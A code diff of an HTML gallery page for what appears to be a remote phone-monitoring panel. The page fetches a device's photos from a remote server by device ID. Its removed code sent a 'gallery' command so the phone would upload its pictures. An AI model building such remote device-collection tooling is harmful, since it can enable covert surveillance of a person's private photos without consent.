@@ -3,85 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gallery - Device Control</title>
+    <title>Cloud Gallery</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --accent: #00f3ff; /* Cyan accent for gallery */
+            --card-bg: #1a1a1a;
+            --accent: #00f3ff; /* Cyan Color */
         }
-
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
-            color: var(--text-main);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 10px;
-            display: flex; justify-content: center;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 20px;
+            text-align: center;
         }
-
-        .container {
-            width: 100%; max-width: 450px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
-        }
-
+        .container { max-width: 500px; margin: auto; }
+        
+        /* Header Design */
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 15px; padding-bottom: 10px;
-            border-bottom: 1px solid var(--glass-border);
+            margin-bottom: 20px; padding-bottom: 15px; 
+            border-bottom: 1px solid #333;
         }
-
-        #apiStatus {
-            background: rgba(0, 243, 255, 0.05);
-            font-size: 11px; padding: 10px; border-radius: 12px;
-            margin-bottom: 15px; border-left: 3px solid var(--accent);
-            color: var(--accent); font-family: monospace;
-        }
-
         .back-btn {
-            color: var(--text-main); font-size: 1.2rem;
-            text-decoration: none; display: flex; align-items: center; justify-content: center;
-            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
+            color: white; font-size: 1.2rem; text-decoration: none;
+            background: #333; width: 35px; height: 35px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
         }
+        h3 { margin: 0; letter-spacing: 1px; color: var(--accent); }
 
-        /* Gallery Grid */
+        /* Gallery Grid Layout */
         .gallery-grid {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
-            max-height: 600px; overflow-y: auto; padding-right: 5px;
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); /* 3 Photos per row */
+            gap: 10px;
+            margin-bottom: 20px;
         }
-
         .img-card {
-            aspect-ratio: 1/1; border-radius: 12px; overflow: hidden;
-            border: 1px solid var(--glass-border); background: #222;
-            cursor: pointer; position: relative;
+            aspect-ratio: 1/1; 
+            background: var(--card-bg); 
+            border-radius: 10px; 
+            overflow: hidden;
+            border: 1px solid #333; 
+            cursor: pointer;
+            transition: transform 0.2s;
         }
-
+        .img-card:active { transform: scale(0.95); }
         .img-card img { width: 100%; height: 100%; object-fit: cover; }
 
-        .time-tag {
-            position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.6);
-            font-size: 8px; text-align: center; color: var(--accent); padding: 2px 0;
+        /* Load More Button */
+        .load-more-btn {
+            background: var(--accent); color: black; border: none;
+            padding: 12px 30px; border-radius: 25px; 
+            font-weight: bold; cursor: pointer; font-size: 14px;
+            margin-top: 10px; width: 80%; 
+            display: none; /* Hidden shuru mein */
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
         }
+        .load-more-btn:disabled { background: #555; color: #888; box-shadow: none; }
 
-        .refresh-btn {
-            background: var(--accent); border: none; color: black;
-            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
-        }
-
-        /* Modal for full view */
+        /* Full Screen Image Modal */
         .modal {
-            position: fixed; top:0; left:0; width:100%; height:100%;
-            background:rgba(0,0,0,0.9); display:none; align-items:center;
-            justify-content:center; z-index:1000;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); display: none;
+            align-items: center; justify-content: center; z-index: 1000;
         }
-        .modal img { max-width: 90%; max-height: 80%; border-radius: 10px; border: 1px solid var(--accent); }
+        .modal img { max-width: 100%; max-height: 80%; border-radius: 5px; box-shadow: 0 0 20px rgba(0,243,255,0.2); }
+        .close-modal {
+            position: absolute; top: 20px; right: 20px; color: white;
+            font-size: 30px; cursor: pointer; padding: 10px;
+        }
+        
+        /* Status Message */
+        #statusMsg { color: #888; margin-top: 20px; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -89,133 +84,119 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Gallery Vault</span>
-            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
+            <h3><i class="fa-regular fa-images"></i> Gallery</h3>
+            <div style="width: 35px;"></div>
         </div>
 
-        <div id="apiStatus">Initializing Gallery...</div>
+        <div id="statusMsg">Connecting to Cloud...</div>
 
-        <div class="gallery-grid" id="galleryContainer">
-            <div style="grid-column: span 3; text-align: center; color: #666; margin-top: 50px;">Waiting for photos...</div>
-        </div>
+        <div class="gallery-grid" id="galleryContainer"></div>
+
+        <button id="loadMoreBtn" class="load-more-btn" onclick="loadPhotos()">Load More Photos</button>
     </div>
 
     <div class="modal" id="modal" onclick="this.style.display='none'">
+        <span class="close-modal">&times;</span>
         <img id="modalImg" src="">
     </div>
 
     <script>
+        // --- CONFIGURATION ---
+        // Tumhara fixed Render URL
         const SERVER_URL = "https://child-v9no.onrender.com";
+
+        // URL se Device ID nikalo (e.g. ?id=DEVICE123)
         const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
-        const storageKey = `gallery_${DEVICE_ID}`;
-        const statusEl = document.getElementById("apiStatus");
-        let retryCount = 0;
+        const DEVICE_ID = urlParams.get('id');
 
-        function setStatus(msg, isError = false) {
-            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
-            statusEl.innerHTML = `🖼️ <strong>Status:</strong> ${msg}`;
-        }
+        let nextCursor = null; // Agle page ka token
+        let isLoading = false;
 
-        document.addEventListener("DOMContentLoaded", () => {
-            if (!DEVICE_ID) {
-                setStatus("Error: Device ID missing!", true);
+        // Start Logic
+        window.onload = () => {
+            if(!DEVICE_ID) {
+                document.getElementById("statusMsg").innerHTML = "<span style='color:red'>Error: Device ID missing!</span>";
                 return;
             }
-            setStatus(`Device ID: ${DEVICE_ID} detected.`);
+            loadPhotos();
+        };
+
+        // --- FETCH PHOTOS FUNCTION ---
+        async function loadPhotos() {
+            if (isLoading) return;
+            isLoading = true;
             
-            // 1. Pehle local storage se dikhao (taaki screen khali na lage)
-            loadFromStorage();
-            
-            // 2. Automatic command bhejo phone ko
-            handleRefresh();
-        });
-
-        function loadFromStorage() {
-            const saved = localStorage.getItem(storageKey);
-            if (saved) {
-                renderGallery(JSON.parse(saved));
-            }
-        }
-
-        function handleRefresh() {
-            retryCount = 0;
-            sendCommand();
-            // 5 second ka gap do phone ko upload karne ke liye
-            setTimeout(fetchData, 5000);
-        }
-
-        function sendCommand() {
-            setStatus("Sending 'gallery' command to phone...");
-            fetch(`${SERVER_URL}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: 'gallery' })
-            }).then(res => res.json())
-              .then(data => console.log("Gallery Command Sent"));
-        }
-
-        function fetchData() {
-            const btn = document.getElementById("refreshBtn");
-            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
-            
-            // Cache busting ke liye timestamp use kiya
-            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`;
-
-            fetch(apiURL)
-                .then(res => res.json())
-                .then(data => {
-                    if (!data || data.length === 0) {
-                        if (retryCount < 8) { // Gallery heavy hoti hai isliye 8 baar try karega
-                            retryCount++;
-                            setStatus(`Waiting for phone to upload photos (Attempt ${retryCount}/8)...`);
-                            setTimeout(fetchData, 5000);
-                        } else {
-                            setStatus("No photos received. Phone might be slow or offline.", true);
-                        }
-                        return;
-                    }
-
-                    // Data mil gaya
-                    localStorage.setItem(storageKey, JSON.stringify(data));
-                    setStatus(`Received ${data.length} photos.`);
-                    renderGallery(data);
-                })
-                .catch(err => setStatus("Error: " + err.message, true))
-                .finally(() => {
-                    btn.innerHTML = 'Refresh';
-                });
-        }
-
-        function renderGallery(data) {
+            const btn = document.getElementById("loadMoreBtn");
+            const status = document.getElementById("statusMsg");
             const container = document.getElementById("galleryContainer");
-            container.innerHTML = "";
-            
-            data.forEach(imgData => {
-                if(!imgData.image) return;
-                
-                const card = document.createElement('div');
-                card.className = 'img-card';
-                
-                let src = imgData.image.startsWith('data') ? imgData.image : `data:image/jpeg;base64,${imgData.image}`;
-                
-                let dateStr = "";
-                if(imgData.time) {
-                    const d = new Date(imgData.time);
-                    dateStr = d.getHours() + ":" + (d.getMinutes()<10?'0':'') + d.getMinutes();
+
+            // UI Update
+            if(nextCursor) btn.innerText = "Loading...";
+            else status.innerText = "Checking Storage...";
+
+            try {
+                // API URL banana
+                let url = `${SERVER_URL}/api/gallery-list/${DEVICE_ID}`;
+                if (nextCursor) {
+                    url += `?next_cursor=${nextCursor}`;
                 }
 
-                card.innerHTML = `
-                    <img src="${src}" loading="lazy">
-                    <div class="time-tag">${dateStr}</div>
-                `;
+                // Server Call
+                const res = await fetch(url);
+                const data = await res.json();
 
-                card.onclick = () => {
-                    document.getElementById('modalImg').src = src;
+                // Check Data
+                if (data.photos && data.photos.length > 0) {
+                    status.style.display = 'none'; // Message chupao
+                    renderGallery(data.photos);
+                    
+                    // Setup Next Page
+                    nextCursor = data.next_cursor;
+                    
+                    if (nextCursor) {
+                        btn.style.display = "inline-block";
+                        btn.innerText = "Load More";
+                        btn.disabled = false;
+                    } else {
+                        btn.style.display = "none"; // List khatam
+                        // Ek chota message niche add kar sakte ho agar chaho
+                    }
+                } else {
+                    // Agar pehli baar me hi koi photo nahi mili
+                    if(container.children.length === 0) {
+                        status.innerText = "No photos found in Cloud Storage.";
+                        status.style.display = 'block';
+                    }
+                    btn.style.display = "none";
+                }
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = "Server Error or Offline.";
+                status.style.color = "red";
+                btn.innerText = "Try Again";
+            }
+            isLoading = false;
+        }
+
+        // --- RENDER PHOTOS ---
+        function renderGallery(photoUrls) {
+            const container = document.getElementById("galleryContainer");
+            
+            photoUrls.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'img-card';
+                
+                // Image Tag
+                div.innerHTML = `<img src="${url}" loading="lazy">`;
+                
+                // Click Event (Open Full Screen)
+                div.onclick = () => {
+                    document.getElementById('modalImg').src = url;
                     document.getElementById('modal').style.display = 'flex';
                 };
                 
-                container.appendChild(card);
+                container.appendChild(div);
             });
         }
     </script>
